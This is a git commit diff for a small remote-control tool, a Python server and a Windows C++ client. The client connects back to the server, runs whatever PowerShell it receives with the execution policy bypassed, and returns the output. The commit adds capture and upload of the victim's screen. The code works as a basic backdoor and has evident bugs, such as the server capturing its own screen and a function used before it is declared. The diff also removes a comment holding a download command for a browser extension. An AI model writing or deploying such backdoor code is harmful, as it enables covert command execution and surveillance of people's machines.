70bf2a39a653fd979563032997c351c2d116161f
orimeged <orimeged4@gmail.com>
2023-07-27 14:55:34 +0300

    I added an option so that fire_ball(server) can request a screenshot from fire_s(client)

--- spirit ball/ball.py
+++ spirit ball/ball.py
@@ -1,6 +1,7 @@
 import socket
-#command to downloads extensions:->
-#mkdir potho ; cd potho ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orimeged/Extensions/main/blocker.js" -OutFile "./p.js"  ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orimeged/Extensions/main/manifest.json" -OutFile "./p2.json"
+import os
+import subprocess
+from PIL import ImageGrab  # ספריית PIL מאפשרת צילום מסך בצד השרת
 
 server_socket = socket.socket()
 server_socket.bind(("0.0.0.0", 1337))
@@ -8,25 +9,35 @@ server_socket.listen()
 print("Server is up and running")
 (client_socket, client_address) = server_socket.accept()
 
-
-
-
-
 print("Client connected")
-reply=" "
+reply = " "
 command = " "
-while(reply != "exit_of_server"):
+
+while reply != "exit_of_server":
+    print("1")
     reply = input()
+    print("2")
     client_socket.send(reply.encode())
-    if(reply == "power"):
-        while(command != "exit_power"):
+    if reply == "power":
+        while command != "exit_power":
             print(">")
             command = input()
             client_socket.send(command.encode())
             output = client_socket.recv(1024).decode()
             print(output)
 
-
+    # פקודה מיוחדת לבצע צילום מסך ושליחת התמונה
+    elif reply == "screenshot":
+        screenshot = ImageGrab.grab()
+        screenshot.save("screenshot.jpg")
+        file_size = os.path.getsize("screenshot.jpg")
+        client_socket.send(f"Sending screenshot ({file_size} bytes)".encode())
+        with open("screenshot.jpg", "rb") as file:
+            data = file.read(1024)
+            while data:
+                client_socket.send(data)
+                data = file.read(1024)
+        client_socket.send("screenshot_done".encode())
 
 client_socket.close()
 server_socket.close()
--- spirit fire/spirit_fire/fire.cpp
+++ spirit fire/spirit_fire/fire.cpp
@@ -1,10 +1,10 @@
 #include <iostream>
-#include<ctime>
+#include <ctime>
 #include <string>
-#include<string.h>
+#include <string.h>
 #include <WS2tcpip.h>
 #include <cstdlib>
-#include<Windows.h>
+#include <Windows.h>
 #include <cstdio>
 #include <iostream>
 #include <memory>
@@ -12,135 +12,200 @@
 #include <string>
 #include <array>
 #include <fstream>
+#include <gdiplus.h>
+#include <Shlwapi.h>
 #pragma comment(lib, "ws2_32.lib")
-
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "Shlwapi.lib")
 
 using namespace std;
 
-
 std::string exec(const char* cmd) {
-	std::array<char, 128> buffer;
-	std::string result;
-	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
-	if (!pipe) {
-		throw std::runtime_error("popen() failed!");
-	}
-	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-		result += buffer.data();
-	}
-	return result;
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
 }
 
+void sendScreenshot(SOCKET sock) {
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
+
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+    HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);
+
+    BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
+    Gdiplus::Bitmap bitmap(hBitmap, NULL);
+
+    CLSID clsid;
+    GetEncoderClsid(L"image/jpeg", &clsid);
+
+    std::wstring fileName = L"screenshot.jpg";
+    PathCombineW((LPWSTR)fileName.data(), L".\\", fileName.data());
+
+    bitmap.Save(fileName.c_str(), &clsid, NULL);
+
+    SelectObject(hdcMemory, hBitmapOld);
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMemory);
+    ReleaseDC(NULL, hdcScreen);
+
+    Gdiplus::GdiplusShutdown(gdiplusToken);
+
+    std::ifstream file(fileName, std::ios::binary);
+    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    remove(fileName.c_str());
+
+    int bufferSize = buffer.size();
+    send(sock, (char*)&bufferSize, sizeof(bufferSize), 0);
+    send(sock, buffer.data(), bufferSize, 0);
+}
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0;
+    UINT size = 0;
+
+    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
+
+    Gdiplus::GetImageEncodersSize(&num, &size);
+    if (size == 0)
+        return -1;
+
+    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL)
+        return -1;
+
+    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
+
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+
+    free(pImageCodecInfo);
+    return -1;
+}
 
 void main()
 {
-	string ipAddress = "127.0.0.1";			// IP Address of the server
-	int port = 1337;						// Listening port # on the server
+    string ipAddress = "127.0.0.1";            // IP Address of the server
+    int port = 1337;                        // Listening port # on the server
 
-	// Initialize WinSock
-	WSAData data;
-	WORD ver = MAKEWORD(2, 2);
-	int wsResult = WSAStartup(ver, &data);
-	if (wsResult != 0)
-	{
-		cerr << "Can't start Winsock, Err #" << wsResult << endl;
-		return;
-	}
+    // Initialize WinSock
+    WSAData data;
+    WORD ver = MAKEWORD(2, 2);
+    int wsResult = WSAStartup(ver, &data);
+    if (wsResult != 0)
+    {
+        cerr << "Can't start Winsock, Err #" << wsResult << endl;
+        return;
+    }
 
-	// Create socket
-	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-	if (sock == INVALID_SOCKET)
-	{
-		cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
-		WSACleanup();
-		return;
-	}
+    // Create socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET)
+    {
+        cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
+        WSACleanup();
+        return;
+    }
 
-	// Fill in a hint structure
-	sockaddr_in hint;
-	hint.sin_family = AF_INET;
-	hint.sin_port = htons(port);
-	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);
+    // Fill in a hint structure
+    sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);
 
-	// Connect to server
-	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
-	if (connResult == SOCKET_ERROR)
-	{
-		cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
-		closesocket(sock);
-		WSACleanup();
-		return;
-	}
+    // Connect to server
+    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
+    if (connResult == SOCKET_ERROR)
+    {
+        cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
 
-	// Do-while loop to send and receive data
-	char buf[4096];
-	char p[] = "power";
-	char e_power[] = "exit_power";
-	char e_of_server[] = "exit_of_server";
-	string userInput;
-	string result = "";
+    // Do-while loop to send and receive data
+    char buf[4096];
+    char p[] = "power";
+    char screenshot[] = "screenshot";
+    char e_power[] = "exit_power";
+    char e_of_server[] = "exit_of_server";
+    string userInput;
+    string result = "";
 
-	ZeroMemory(buf, 4096);
-	int bytesReceived = recv(sock, buf, 4096, 0);
+    ZeroMemory(buf, 4096);
+    int bytesReceived = recv(sock, buf, 4096, 0);
 
-	while (strcmp(buf, e_of_server) != 0)
-	{
+    while (strcmp(buf, e_of_server) != 0)
+    {
+        if (bytesReceived > 0)
+        {
+            if (strcmp(buf, p) == 0)
+            {
+                while (strcmp(buf, e_power) != 0)
+                {
+                    ZeroMemory(buf, 4096);
+                    int bytesReceived = recv(sock, buf, 4096, 0);
 
-		if (bytesReceived > 0)
-		{
-			if (strcmp(buf, p) == 0)
-			{
-				while (strcmp(buf, e_power) != 0)
-				{
-					ZeroMemory(buf, 4096);
-					int bytesReceived = recv(sock, buf, 4096, 0);
-					ofstream file;	
-					file.open("test.ps1");
+                    if (strcmp(buf, screenshot) == 0)
+                    {
+                        sendScreenshot(sock);
+                    }
+                    else
+                    {
+                        ofstream file;
+                        file.open("test.ps1");
 
-					string newArg = "-auto";
-					string powershell;
-					powershell = buf;
+                        string newArg = "-auto";
+                        string powershell;
+                        powershell = buf;
 
-					file << powershell << endl;
-					file.close();
+                        file << powershell << endl;
+                        file.close();
 
-					result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
+                        result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
 
-					if (result.size() > 0) {
-						remove("test.ps1");
+                        if (result.size() > 0) {
+                            remove("test.ps1");
 
+                            int sendResult = send(sock, result.c_str(), result.size(), 0);
+                            result = "";
+                        }
+                        else
+                        {
+                            result = "It happened";
+                            int sendResult = send(sock, result.c_str(), result.size(), 0);
+                        }
+                    }
+                }
+            }
 
+            ZeroMemory(buf, 4096);
+            int bytesReceived = recv(sock, buf, 4096, 0);
+        }
+    }
 
-
-						int sendResult = send(sock, result.c_str(), result.size(), 0);
-						result = "";
-					}
-					else
-					{
-						result = "It happend";
-						int sendResult = send(sock, result.c_str(), result.size(), 0);
-					}
-
-
-
-
-				}
-
-			}
-
-			ZeroMemory(buf, 4096);
-			int bytesReceived = recv(sock, buf, 4096, 0);
-
-		}
-
-	}
-
-
-
-
-
-
-	// Gracefully close down everything
-	closesocket(sock);
-	WSACleanup();
+    // Gracefully close down everything
+    closesocket(sock);
+    WSACleanup();
 }
